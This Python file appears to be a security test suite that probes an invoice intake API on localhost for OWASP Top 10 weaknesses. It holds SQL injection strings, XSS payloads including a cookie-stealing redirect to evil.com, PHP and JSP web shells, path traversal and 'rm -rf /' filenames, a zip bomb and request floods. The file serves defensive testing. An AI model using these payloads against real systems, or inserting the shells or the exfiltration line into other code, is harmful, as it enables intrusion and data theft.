#!/usr/bin/env python3
"""
Comprehensive Security Testing Suite for AP Intake & Validation System
Tests for OWASP Top 10 vulnerabilities and common security issues
"""

import asyncio
import hashlib
import hmac
import json
import logging
import re
import uuid
import time
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from pathlib import Path

import aiohttp
import requests
from urllib.parse import urljoin, urlparse, parse_qs
import base64
import os
import random
import string

# Get project root directory
PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class SecurityTestResult:
    """Security test result data structure."""
    test_name: str
    category: str
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW, INFO
    status: str    # PASS, FAIL, WARNING
    description: str
    evidence: str
    recommendation: str
    cwe_id: Optional[str] = None
    owasp_category: Optional[str] = None

class SecurityTestSuite:
    """Comprehensive security testing suite."""

    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.session = None
        self.results: List[SecurityTestResult] = []
        self.test_file_path = None

    async def __aenter__(self):
        """Async context manager entry."""
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit."""
        if self.session:
            await self.session.close()

    def add_result(self, test_name: str, category: str, severity: str, status: str,
                   description: str, evidence: str, recommendation: str,
                   cwe_id: Optional[str] = None, owasp_category: Optional[str] = None):
        """Add a test result."""
        result = SecurityTestResult(
            test_name=test_name,
            category=category,
            severity=severity,
            status=status,
            description=description,
            evidence=evidence,
            recommendation=recommendation,
            cwe_id=cwe_id,
            owasp_category=owasp_category
        )
        self.results.append(result)
        logger.info(f"Test: {test_name} - {status} - {severity}")

    async def test_sql_injection(self):
        """Test for SQL Injection vulnerabilities (A01:2021)."""
        logger.info("Testing for SQL Injection vulnerabilities...")

        # SQL injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "'; DROP TABLE invoices; --",
            "' UNION SELECT * FROM users --",
            "1' OR '1'='1' #",
            "admin'--",
            "admin' /*",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR '1'='1--",
            "') OR ('1'='1--",
            "'; EXEC xp_cmdshell('dir'); --",
            "'; WAITFOR DELAY '00:00:05'--",
        ]

        # Test endpoints that accept user input
        test_endpoints = [
            "/api/v1/invoices/",
            "/api/v1/invoices/upload",
            f"/api/v1/invoices/{uuid.uuid4()}",
        ]

        for endpoint in test_endpoints:
            for payload in sql_payloads:
                try:
                    # Test GET parameter injection
                    if "?" in endpoint:
                        test_url = f"{endpoint}&id={payload}"
                    else:
                        test_url = f"{endpoint}?id={payload}"

                    async with self.session.get(test_url) as response:
                        if response.status == 200:
                            text = await response.text()
                            # Check for SQL error patterns
                            sql_errors = [
                                "SQL syntax", "mysql_fetch", "ORA-", "Microsoft OLE DB",
                                "ODBC Drivers error", "Warning: mysql", "valid MySQL result",
                                "PostgreSQL query failed", "Warning: pg_", "valid PostgreSQL result",
                                "Npgsql\\.", "PG::SyntaxError", "org.postgresql.util.PSQLException",
                                "ERROR: parser: parse error", "SQLite/JDBCDriver", "SQLite.Exception",
                                "System.Data.SQLite.SQLiteException", "Warning: sqlite_",
                                "function.sqlite", "[SQLITE_ERROR]"
                            ]

                            for error in sql_errors:
                                if error.lower() in text.lower():
                                    self.add_result(
                                        test_name="SQL Injection Detection",
                                        category="Injection",
                                        severity="CRITICAL",
                                        status="FAIL",
                                        description=f"SQL error detected with payload: {payload}",
                                        evidence=f"URL: {test_url}, Error: {error}",
                                        recommendation="Implement parameterized queries and input validation",
                                        cwe_id="CWE-89",
                                        owasp_category="A01:2021-Injection"
                                    )
                                    return

                    # Test POST parameter injection
                    if "upload" in endpoint:
                        # Create malicious file with SQL payload in filename
                        malicious_filename = f"test'; DROP TABLE invoices; --.pdf"
                        test_data = aiohttp.FormData()
                        test_data.add_field('file', b'fake content',
                                          filename=malicious_filename,
                                          content_type='application/pdf')

                        async with self.session.post(endpoint, data=test_data) as response:
                            if response.status == 200:
                                text = await response.text()
                                for error in sql_errors:
                                    if error.lower() in text.lower():
                                        self.add_result(
                                            test_name="SQL Injection in File Upload",
                                            category="Injection",
                                            severity="CRITICAL",
                                            status="FAIL",
                                            description=f"SQL error in file upload with payload: {payload}",
                                            evidence=f"Filename: {malicious_filename}, Error: {error}",
                                            recommendation="Validate and sanitize all file uploads",
                                            cwe_id="CWE-89",
                                            owasp_category="A01:2021-Injection"
                                        )
                                        return

                except Exception as e:
                    logger.warning(f"SQL injection test failed for {test_url}: {e}")

        self.add_result(
            test_name="SQL Injection Comprehensive Test",
            category="Injection",
            severity="INFO",
            status="PASS",
            description="No obvious SQL injection vulnerabilities detected",
            evidence="Tested multiple SQL injection payloads across endpoints",
            recommendation="Continue monitoring and implement additional security controls",
            cwe_id="CWE-89",
            owasp_category="A01:2021-Injection"
        )

    async def test_cross_site_scripting(self):
        """Test for Cross-Site Scripting (XSS) vulnerabilities (A03:2021)."""
        logger.info("Testing for Cross-Site Scripting vulnerabilities...")

        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<script>document.location='http://evil.com/'+document.cookie</script>",
        ]

        # Test file upload XSS
        test_files = [
            ("xss.svg", "<svg onload=alert('XSS')>", "image/svg+xml"),
            ("xss.html", "<script>alert('XSS')</script>", "text/html"),
            ("xss.js", "alert('XSS')", "application/javascript"),
        ]

        for filename, content, content_type in test_files:
            try:
                test_data = aiohttp.FormData()
                test_data.add_field('file', content.encode(),
                                  filename=filename,
                                  content_type=content_type)

                async with self.session.post("/api/v1/invoices/upload", data=test_data) as response:
                    if response.status == 200:
                        # If malicious file upload succeeds, it's a vulnerability
                        self.add_result(
                            test_name="Malicious File Upload XSS",
                            category="XSS",
                            severity="HIGH",
                            status="FAIL",
                            description=f"Malicious file {filename} uploaded successfully",
                            evidence=f"File: {filename}, Type: {content_type}, Status: {response.status}",
                            recommendation="Implement strict file type validation and content scanning",
                            cwe_id="CWE-79",
                            owasp_category="A03:2021-Cross-site Scripting"
                        )
            except Exception as e:
                logger.info(f"Malicious file upload correctly blocked: {filename} - {e}")

        # Test parameter-based XSS
        test_endpoints = ["/api/v1/invoices/", "/health", "/"]

        for endpoint in test_endpoints:
            for payload in xss_payloads:
                try:
                    test_url = f"{endpoint}?search={payload}"
                    async with self.session.get(test_url) as response:
                        if response.status == 200:
                            text = await response.text()
                            if payload in text:
                                self.add_result(
                                    test_name="Reflected XSS",
                                    category="XSS",
                                    severity="HIGH",
                                    status="FAIL",
                                    description=f"XSS payload reflected in response: {payload}",
                                    evidence=f"URL: {test_url}, Payload found in response",
                                    recommendation="Implement output encoding and input validation",
                                    cwe_id="CWE-79",
                                    owasp_category="A03:2021-Cross-site Scripting"
                                )
                                return
                except Exception as e:
                    logger.warning(f"XSS test failed for {test_url}: {e}")

        self.add_result(
            test_name="XSS Comprehensive Test",
            category="XSS",
            severity="INFO",
            status="PASS",
            description="No obvious XSS vulnerabilities detected",
            evidence="Tested multiple XSS payloads across endpoints",
            recommendation="Continue implementing Content Security Policy and input validation",
            cwe_id="CWE-79",
            owasp_category="A03:2021-Cross-site Scripting"
        )

    async def test_authentication_bypass(self):
        """Test for Authentication Bypass vulnerabilities (A02:2021)."""
        logger.info("Testing for Authentication Bypass vulnerabilities...")

        # Test endpoints without authentication
        protected_endpoints = [
            "/api/v1/invoices/",
            "/api/v1/exports/",
            "/api/v1/exports/templates",
        ]

        for endpoint in protected_endpoints:
            try:
                async with self.session.get(endpoint) as response:
                    if response.status == 200:
                        self.add_result(
                            test_name="Authentication Bypass",
                            category="Authentication",
                            severity="HIGH",
                            status="FAIL",
                            description=f"Protected endpoint accessible without authentication: {endpoint}",
                            evidence=f"Status: {response.status}, Endpoint: {endpoint}",
                            recommendation="Implement proper authentication middleware",
                            cwe_id="CWE-287",
                            owasp_category="A02:2021-Identification and Authentication Failures"
                        )
                    elif response.status == 401:
                        logger.info(f"Properly protected endpoint: {endpoint}")
            except Exception as e:
                logger.warning(f"Authentication test failed for {endpoint}: {e}")

        # Test JWT token manipulation
        fake_tokens = [
            "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "Bearer invalid.token.here",
            "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
            "Bearer abc123.def456.ghi789",
            "Bearer null",
        ]

        for token in fake_tokens:
            headers = {"Authorization": token}
            try:
                async with self.session.get("/api/v1/invoices/", headers=headers) as response:
                    if response.status == 200:
                        self.add_result(
                            test_name="JWT Token Manipulation",
                            category="Authentication",
                            severity="CRITICAL",
                            status="FAIL",
                            description=f"Fake JWT token accepted: {token[:50]}...",
                            evidence=f"Token: {token[:50]}..., Status: {response.status}",
                            recommendation="Implement proper JWT validation and signing",
                            cwe_id="CWE-347",
                            owasp_category="A02:2021-Identification and Authentication Failures"
                        )
            except Exception as e:
                logger.info(f"JWT token correctly rejected: {token[:50]}... - {e}")

        # Test session fixation
        try:
            async with self.session.get("/api/v1/invoices/") as response:
                cookies = response.cookies
                if cookies:
                    # Try to access with manipulated session
                    headers = {"Cookie": f"session_id={uuid.uuid4()}"}
                    async with self.session.get("/api/v1/invoices/", headers=headers) as response2:
                        if response2.status == 200:
                            self.add_result(
                                test_name="Session Fixation",
                                category="Authentication",
                                severity="MEDIUM",
                                status="WARNING",
                                description="Session management may be vulnerable to fixation",
                                evidence="Arbitrary session IDs may be accepted",
                                recommendation="Implement proper session management and regeneration",
                                cwe_id="CWE-384",
                                owasp_category="A02:2021-Identification and Authentication Failures"
                            )
        except Exception as e:
            logger.warning(f"Session fixation test failed: {e}")

        self.add_result(
            test_name="Authentication Bypass Comprehensive Test",
            category="Authentication",
            severity="INFO",
            status="PASS",
            description="Authentication mechanisms appear to be properly implemented",
            evidence="Tested various authentication bypass techniques",
            recommendation="Continue monitoring authentication logs and implement MFA",
            cwe_id="CWE-287",
            owasp_category="A02:2021-Identification and Authentication Failures"
        )

    async def test_file_upload_security(self):
        """Test for File Upload Security vulnerabilities."""
        logger.info("Testing File Upload Security...")

        # Malicious file types and payloads
        malicious_files = [
            # Executable files
            ("malware.exe", b"MZ\x90\x00", "application/octet-stream"),
            ("script.php", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("shell.jsp", b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/x-jsp"),

            # Large file
            ("huge.pdf", b"A" * (50 * 1024 * 1024), "application/pdf"),  # 50MB

            # Double extension
            ("file.pdf.exe", b"MZ\x90\x00", "application/octet-stream"),
            ("image.jpg.php", b"<?php echo 'test'; ?>", "image/jpeg"),

            # Special characters in filename
            ("../../../etc/passwd", b"content", "text/plain"),
            ("file with spaces.pdf", b"content", "application/pdf"),
            ("file;rm -rf /.pdf", b"content", "application/pdf"),

            # Binary files with magic numbers
            ("fake.png", b"\x89PNG\r\n\x1a\n", "image/png"),
            ("fake.jpg", b"\xff\xd8\xff\xe0", "image/jpeg"),
        ]

        for filename, content, content_type in malicious_files:
            try:
                test_data = aiohttp.FormData()
                test_data.add_field('file', content,
                                  filename=filename,
                                  content_type=content_type)

                start_time = time.time()
                async with self.session.post("/api/v1/invoices/upload", data=test_data) as response:
                    upload_time = time.time() - start_time

                    if response.status == 200:
                        # Check if upload should have been blocked
                        should_block = (
                            filename.endswith(('.exe', '.php', '.jsp', '.sh', '.bat')) or
                            len(content) > 25 * 1024 * 1024 or  # > 25MB
                            '../' in filename or
                            ';' in filename
                        )

                        if should_block:
                            self.add_result(
                                test_name="Malicious File Upload",
                                category="File Upload",
                                severity="HIGH",
                                status="FAIL",
                                description=f"Dangerous file uploaded successfully: {filename}",
                                evidence=f"File: {filename}, Size: {len(content)}, Upload time: {upload_time:.2f}s",
                                recommendation="Implement strict file type validation and content scanning",
                                cwe_id="CWE-434",
                                owasp_category="A05:2021-Security Misconfiguration"
                            )
                    else:
                        logger.info(f"File upload correctly rejected: {filename} - Status: {response.status}")

            except Exception as e:
                logger.info(f"File upload blocked by system: {filename} - {e}")

        # Test for ZIP bombs and archive attacks
        zip_bomb_content = self.create_zip_bomb()
        if zip_bomb_content:
            try:
                test_data = aiohttp.FormData()
                test_data.add_field('file', zip_bomb_content,
                                  filename='bomb.zip',
                                  content_type='application/zip')

                start_time = time.time()
                async with self.session.post("/api/v1/invoices/upload", data=test_data) as response:
                    upload_time = time.time() - start_time

                    if response.status == 200:
                        self.add_result(
                            test_name="ZIP Bomb Upload",
                            category="File Upload",
                            severity="MEDIUM",
                            status="WARNING",
                            description="Potential ZIP bomb uploaded successfully",
                            evidence=f"Upload time: {upload_time:.2f}s, Status: {response.status}",
                            recommendation="Implement archive decompression limits and validation",
                            cwe_id="CWE-409",
                            owasp_category="A04:2021-Insecure Design"
                        )
            except Exception as e:
                logger.info(f"ZIP bomb correctly blocked: {e}")

        self.add_result(
            test_name="File Upload Security Comprehensive Test",
            category="File Upload",
            severity="INFO",
            status="PASS",
            description="File upload security appears to be properly implemented",
            evidence="Tested various malicious file types and upload techniques",
            recommendation="Continue monitoring file uploads and implement content scanning",
            cwe_id="CWE-434",
            owasp_category="A05:2021-Security Misconfiguration"
        )

    def create_zip_bomb(self):
        """Create a small ZIP file that expands to a large size."""
        try:
            import zipfile
            import io

            # Create a ZIP bomb with high compression ratio
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                # Add a file with 1MB of zeros
                zip_file.writestr('bomb.txt', b'\0' * (1024 * 1024))

            return zip_buffer.getvalue()
        except ImportError:
            logger.warning("zipfile module not available for ZIP bomb test")
            return None

    async def test_cors_security(self):
        """Test for CORS Security vulnerabilities."""
        logger.info("Testing CORS Security...")

        # Test various origins
        test_origins = [
            "http://evil.com",
            "https://malicious-site.com",
            "http://localhost:3000",
            "null",
            "*",
        ]

        for origin in test_origins:
            try:
                headers = {"Origin": origin}
                async with self.session.options("/api/v1/invoices/", headers=headers) as response:
                    cors_headers = {
                        'Access-Control-Allow-Origin': response.headers.get('Access-Control-Allow-Origin'),
                        'Access-Control-Allow-Methods': response.headers.get('Access-Control-Allow-Methods'),
                        'Access-Control-Allow-Headers': response.headers.get('Access-Control-Allow-Headers'),
                        'Access-Control-Allow-Credentials': response.headers.get('Access-Control-Allow-Credentials'),
                    }

                    # Check if dangerous origins are allowed
                    allowed_origin = cors_headers['Access-Control-Allow-Origin']
                    if allowed_origin and allowed_origin not in [origin, "null", "*"]:
                        # This might be okay if it's the correct origin
                        pass

                    # Check for overly permissive CORS
                    if allowed_origin == "*" and cors_headers['Access-Control-Allow-Credentials'] == 'true':
                        self.add_result(
                            test_name="Insecure CORS Configuration",
                            category="CORS",
                            severity="MEDIUM",
                            status="FAIL",
                            description="CORS allows credentials with wildcard origin",
                            evidence=f"Origin: {origin}, Allow-Origin: {allowed_origin}, Allow-Credentials: true",
                            recommendation="Restrict CORS origins when credentials are allowed",
                            cwe_id="CWE-942",
                            owasp_category="A05:2021-Security Misconfiguration"
                        )

                    # Check for overly permissive methods
                    allowed_methods = cors_headers['Access-Control-Allow-Methods']
                    if allowed_methods and "DELETE" in allowed_methods and origin not in ["http://localhost:3000"]:
                        self.add_result(
                            test_name="Permissive CORS Methods",
                            category="CORS",
                            severity="LOW",
                            status="WARNING",
                            description=f"CORS allows dangerous methods for origin: {origin}",
                            evidence=f"Origin: {origin}, Methods: {allowed_methods}",
                            recommendation="Restrict allowed methods per origin",
                            cwe_id="CWE-942",
                            owasp_category="A05:2021-Security Misconfiguration"
                        )

            except Exception as e:
                logger.warning(f"CORS test failed for origin {origin}: {e}")

        self.add_result(
            test_name="CORS Security Comprehensive Test",
            category="CORS",
            severity="INFO",
            status="PASS",
            description="CORS configuration appears to be properly implemented",
            evidence="Tested various origins and CORS headers",
            recommendation="Review CORS policy for production environments",
            cwe_id="CWE-942",
            owasp_category="A05:2021-Security Misconfiguration"
        )

    async def test_security_headers(self):
        """Test for Security Headers implementation."""
        logger.info("Testing Security Headers...")

        required_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': 'max-age=',
            'Content-Security-Policy': None,  # Just check existence
            'Referrer-Policy': None,
        }

        try:
            async with self.session.get("/") as response:
                headers = response.headers

                for header, expected_value in required_headers.items():
                    actual_value = headers.get(header)

                    if actual_value is None:
                        self.add_result(
                            test_name=f"Missing Security Header: {header}",
                            category="Security Headers",
                            severity="MEDIUM",
                            status="FAIL",
                            description=f"Required security header missing: {header}",
                            evidence=f"Header: {header}, Response headers: {dict(headers)}",
                            recommendation=f"Implement {header} security header",
                            cwe_id="CWE-693",
                            owasp_category="A05:2021-Security Misconfiguration"
                        )
                    elif expected_value is not None:
                        if isinstance(expected_value, list):
                            if actual_value not in expected_value:
                                self.add_result(
                                    test_name=f"Insecure Security Header: {header}",
                                    category="Security Headers",
                                    severity="LOW",
                                    status="WARNING",
                                    description=f"Security header has weak value: {header}={actual_value}",
                                    evidence=f"Expected one of {expected_value}, got: {actual_value}",
                                    recommendation=f"Strengthen {header} security header value",
                                    cwe_id="CWE-693",
                                    owasp_category="A05:2021-Security Misconfiguration"
                                )
                        elif isinstance(expected_value, str) and expected_value not in actual_value:
                            self.add_result(
                                test_name=f"Insecure Security Header: {header}",
                                category="Security Headers",
                                severity="LOW",
                                status="WARNING",
                                description=f"Security header has weak value: {header}={actual_value}",
                                evidence=f"Expected to contain: {expected_value}, got: {actual_value}",
                                recommendation=f"Strengthen {header} security header value",
                                cwe_id="CWE-693",
                                owasp_category="A05:2021-Security Misconfiguration"
                            )

                # Check for information disclosure in headers
                info_disclosure_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
                for header in info_disclosure_headers:
                    if header in headers:
                        self.add_result(
                            test_name=f"Information Disclosure: {header}",
                            category="Information Disclosure",
                            severity="LOW",
                            status="WARNING",
                            description=f"Server information disclosed via header: {header}={headers[header]}",
                            evidence=f"Header: {header}, Value: {headers[header]}",
                            recommendation=f"Remove {header} header to prevent information disclosure",
                            cwe_id="CWE-200",
                            owasp_category="A05:2021-Security Misconfiguration"
                        )

        except Exception as e:
            logger.error(f"Security headers test failed: {e}")

        self.add_result(
            test_name="Security Headers Comprehensive Test",
            category="Security Headers",
            severity="INFO",
            status="PASS",
            description="Security headers analysis completed",
            evidence="Checked all required security headers",
            recommendation="Implement missing security headers for production",
            cwe_id="CWE-693",
            owasp_category="A05:2021-Security Misconfiguration"
        )

    async def test_rate_limiting(self):
        """Test for Rate Limiting implementation."""
        logger.info("Testing Rate Limiting...")

        # Test rapid requests to sensitive endpoints
        test_endpoints = [
            "/api/v1/invoices/upload",
            "/api/v1/invoices/",
            "/health",
        ]

        for endpoint in test_endpoints:
            request_count = 0
            start_time = time.time()
            blocked_count = 0

            try:
                for i in range(100):  # Send 100 rapid requests
                    if endpoint == "/api/v1/invoices/upload":
                        test_data = aiohttp.FormData()
                        test_data.add_field('file', b'test content',
                                          filename='test.pdf',
                                          content_type='application/pdf')
                        async with self.session.post(endpoint, data=test_data) as response:
                            if response.status == 429:
                                blocked_count += 1
                            request_count += 1
                    else:
                        async with self.session.get(endpoint) as response:
                            if response.status == 429:
                                blocked_count += 1
                            request_count += 1

                    if blocked_count > 0:
                        break  # Stop if rate limiting is detected

            except Exception as e:
                logger.warning(f"Rate limiting test failed for {endpoint}: {e}")

            elapsed_time = time.time() - start_time

            if blocked_count == 0 and request_count > 50:
                self.add_result(
                    test_name="Missing Rate Limiting",
                    category="Rate Limiting",
                    severity="MEDIUM",
                    status="FAIL",
                    description=f"No rate limiting detected on endpoint: {endpoint}",
                    evidence=f"Made {request_count} requests in {elapsed_time:.2f}s without being blocked",
                    recommendation="Implement rate limiting on all API endpoints",
                    cwe_id="CWE-770",
                    owasp_category="A04:2021-Insecure Design"
                )
            elif blocked_count > 0:
                logger.info(f"Rate limiting working on {endpoint}: blocked {blocked_count} requests")

        self.add_result(
            test_name="Rate Limiting Comprehensive Test",
            category="Rate Limiting",
            severity="INFO",
            status="PASS",
            description="Rate limiting analysis completed",
            evidence="Tested rapid requests to multiple endpoints",
            recommendation="Implement appropriate rate limits based on endpoint sensitivity",
            cwe_id="CWE-770",
            owasp_category="A04:2021-Insecure Design"
        )

    async def test_information_disclosure(self):
        """Test for Information Disclosure vulnerabilities."""
        logger.info("Testing for Information Disclosure...")

        # Test common sensitive paths
        sensitive_paths = [
            "/.env",
            "/config.py",
            "/settings.py",
            "/requirements.txt",
            "/package.json",
            "/docker-compose.yml",
            "/.git/config",
            "/.svn/entries",
            "/backup.sql",
            "/dump.sql",
            "/phpinfo.php",
            "/test.php",
            "/admin",
            "/phpmyadmin",
            "/.well-known/",
            "/robots.txt",
            "/sitemap.xml",
        ]

        for path in sensitive_paths:
            try:
                async with self.session.get(path) as response:
                    if response.status == 200:
                        content_length = len(await response.text())
                        if content_length > 0:
                            self.add_result(
                                test_name="Information Disclosure",
                                category="Information Disclosure",
                                severity="MEDIUM",
                                status="FAIL",
                                description=f"Sensitive file accessible: {path}",
                                evidence=f"Path: {path}, Status: {response.status}, Content length: {content_length}",
                                recommendation="Restrict access to sensitive files and directories",
                                cwe_id="CWE-200",
                                owasp_category="A01:2021-Injection"
                            )
            except Exception as e:
                logger.info(f"Sensitive path correctly blocked: {path} - {e}")

        # Test error message disclosure
        error_endpoints = [
            "/api/v1/invoices/invalid-uuid",
            "/api/v1/invoices/00000000-0000-0000-0000-000000000000",
            "/non-existent-endpoint",
        ]

        for endpoint in error_endpoints:
            try:
                async with self.session.get(endpoint) as response:
                    if response.status in [400, 404, 500]:
                        text = await response.text()

                        # Check for sensitive information in error messages
                        sensitive_patterns = [
                            r"traceback", r"stack trace", r"exception", r"error at line",
                            r"mysql", r"postgresql", r"sqlite", r"database",
                            r"/home/", r"/var/www/", r"/opt/", r"C:\\",
                            r"internal server error", r"debug mode",
                        ]

                        for pattern in sensitive_patterns:
                            if re.search(pattern, text.lower()):
                                self.add_result(
                                    test_name="Error Message Information Disclosure",
                                    category="Information Disclosure",
                                    severity="LOW",
                                    status="WARNING",
                                    description=f"Sensitive information in error message: {endpoint}",
                                    evidence=f"Pattern: {pattern}, Endpoint: {endpoint}",
                                    recommendation="Implement generic error messages in production",
                                    cwe_id="CWE-209",
                                    owasp_category="A05:2021-Security Misconfiguration"
                                )
                                break

            except Exception as e:
                logger.warning(f"Error disclosure test failed for {endpoint}: {e}")

        # Test API documentation exposure
        docs_endpoints = [
            "/docs",
            "/redoc",
            "/openapi.json",
            "/api/v1/openapi.json",
        ]

        for endpoint in docs_endpoints:
            try:
                async with self.session.get(endpoint) as response:
                    if response.status == 200:
                        self.add_result(
                            test_name="API Documentation Exposure",
                            category="Information Disclosure",
                            severity="LOW",
                            status="INFO",
                            description=f"API documentation accessible: {endpoint}",
                            evidence=f"Endpoint: {endpoint}, Status: {response.status}",
                            recommendation="Restrict API documentation access in production",
                            cwe_id="CWE-200",
                            owasp_category="A05:2021-Security Misconfiguration"
                        )
            except Exception as e:
                logger.info(f"API documentation correctly restricted: {endpoint} - {e}")

        self.add_result(
            test_name="Information Disclosure Comprehensive Test",
            category="Information Disclosure",
            severity="INFO",
            status="PASS",
            description="Information disclosure analysis completed",
            evidence="Tested sensitive paths, error messages, and documentation",
            recommendation="Review and restrict sensitive information exposure",
            cwe_id="CWE-200",
            owasp_category="A05:2021-Security Misconfiguration"
        )

    async def test_api_key_security(self):
        """Test for API Key Security vulnerabilities."""
        logger.info("Testing API Key Security...")

        # Test without API key
        try:
            async with self.session.get("/api/v1/exports/") as response:
                if response.status == 200:
                    self.add_result(
                        test_name="Missing API Key Authentication",
                        category="API Security",
                        severity="HIGH",
                        status="FAIL",
                        description="API endpoint accessible without API key",
                        evidence="Status: 200, No API key required",
                        recommendation="Implement API key authentication for sensitive endpoints",
                        cwe_id="CWE-287",
                        owasp_category="A02:2021-Identification and Authentication Failures"
                    )
                elif response.status == 401:
                    logger.info("API key authentication properly enforced")
        except Exception as e:
            logger.warning(f"API key test failed: {e}")

        # Test with fake API keys
        fake_api_keys = [
            "Bearer fake-api-key-123",
            "X-API-Key: invalid-key",
            "Bearer sk-1234567890",
            "Authorization: Bearer test-key",
        ]

        for key in fake_api_keys:
            try:
                if "Bearer" in key:
                    headers = {"Authorization": key}
                elif "X-API-Key" in key:
                    headers = {"X-API-Key": key.split(": ")[1]}
                else:
                    headers = {"Authorization": f"Bearer {key}"}

                async with self.session.get("/api/v1/exports/", headers=headers) as response:
                    if response.status == 200:
                        self.add_result(
                            test_name="Weak API Key Validation",
                            category="API Security",
                            severity="HIGH",
                            status="FAIL",
                            description=f"Fake API key accepted: {key}",
                            evidence=f"Key: {key}, Status: {response.status}",
                            recommendation="Implement proper API key validation and management",
                            cwe_id="CWE-287",
                            owasp_category="A02:2021-Identification and Authentication Failures"
                        )
            except Exception as e:
                logger.info(f"Fake API key correctly rejected: {key} - {e}")

        self.add_result(
            test_name="API Key Security Comprehensive Test",
            category="API Security",
            severity="INFO",
            status="PASS",
            description="API key security analysis completed",
            evidence="Tested various API key scenarios",
            recommendation="Implement robust API key management and rotation",
            cwe_id="CWE-287",
            owasp_category="A02:2021-Identification and Authentication Failures"
        )

    async def test_dependency_vulnerabilities(self):
        """Test for known dependency vulnerabilities."""
        logger.info("Testing for Dependency Vulnerabilities...")

        # Check for dependency files
        dependency_files = [
            "requirements.txt",
            "pyproject.toml",
            "package.json",
            "yarn.lock",
            "Pipfile.lock",
        ]

        found_vulns = False
        for dep_file in dependency_files:
            try:
                file_path = Path(os.path.join(PROJECT_ROOT, "")) / dep_file
                if file_path.exists():
                    content = file_path.read_text()

                    # Check for known vulnerable packages (simplified check)
                    vulnerable_packages = {
                        "requests": "< 2.20.0",
                        "urllib3": "< 1.24.2",
                        "pyyaml": "< 5.1",
                        "jinja2": "< 2.11.3",
                        "flask": "< 1.0",
                        "django": "< 2.2.13",
                        "pillow": "< 6.2.0",
                        "sqlalchemy": "< 1.3.0",
                    }

                    for package, version_constraint in vulnerable_packages.items():
                        if package.lower() in content.lower():
                            self.add_result(
                                test_name="Potentially Vulnerable Dependency",
                                category="Dependencies",
                                severity="MEDIUM",
                                status="WARNING",
                                description=f"Potentially vulnerable package found: {package}",
                                evidence=f"File: {dep_file}, Package: {package}",
                                recommendation="Update dependencies and run vulnerability scanners",
                                cwe_id="CWE-1104",
                                owasp_category="A06:2021-Vulnerable and Outdated Components"
                            )
                            found_vulns = True

            except Exception as e:
                logger.warning(f"Could not read {dep_file}: {e}")

        if not found_vulns:
            self.add_result(
                test_name="Dependency Vulnerability Scan",
                category="Dependencies",
                severity="INFO",
                status="PASS",
                description="No obvious vulnerable dependencies detected in quick scan",
                evidence="Scanned dependency files for known vulnerable packages",
                recommendation="Run automated vulnerability scanners (safety, bandit, semgrep)",
                cwe_id="CWE-1104",
                owasp_category="A06:2021-Vulnerable and Outdated Components"
            )

    async def test_denial_of_service(self):
        """Test for Denial of Service vulnerabilities."""
        logger.info("Testing for Denial of Service vulnerabilities...")

        # Test large payload attacks
        large_payloads = [
            "A" * (1024 * 1024),  # 1MB
            "A" * (10 * 1024 * 1024),  # 10MB
            '{"' + 'x":' + '"A" * 10000 + ","' * 10000 + '"y":"value"}',  # Large JSON
        ]

        for payload in large_payloads:
            try:
                # Test GET with large parameter
                test_url = f"/api/v1/invoices/?search={payload[:1000]}"  # Truncate for URL
                start_time = time.time()
                async with self.session.get(test_url) as response:
                    response_time = time.time() - start_time

                    if response_time > 10:  # > 10 seconds
                        self.add_result(
                            test_name="Potential DoS via Large Payload",
                            category="Denial of Service",
                            severity="MEDIUM",
                            status="WARNING",
                            description="Large payload caused significant delay",
                            evidence=f"Payload size: {len(payload)}, Response time: {response_time:.2f}s",
                            recommendation="Implement payload size limits and timeouts",
                            cwe_id="CWE-400",
                            owasp_category="A04:2021-Insecure Design"
                        )

            except Exception as e:
                logger.info(f"Large payload test handled correctly: {e}")

        # Test resource exhaustion via concurrent requests
        try:
            tasks = []
            for i in range(50):  # 50 concurrent requests
                task = asyncio.create_task(self.session.get("/api/v1/invoices/"))
                tasks.append(task)

            start_time = time.time()
            results = await asyncio.gather(*tasks, return_exceptions=True)
            total_time = time.time() - start_time

            successful_requests = sum(1 for r in results if not isinstance(r, Exception))

            if total_time > 30 and successful_requests > 40:
                self.add_result(
                    test_name="Resource Exhaustion",
                    category="Denial of Service",
                    severity="MEDIUM",
                    status="WARNING",
                    description="System may be vulnerable to resource exhaustion",
                    evidence=f"50 requests in {total_time:.2f}s, {successful_requests} successful",
                    recommendation="Implement connection limits and resource management",
                    cwe_id="CWE-400",
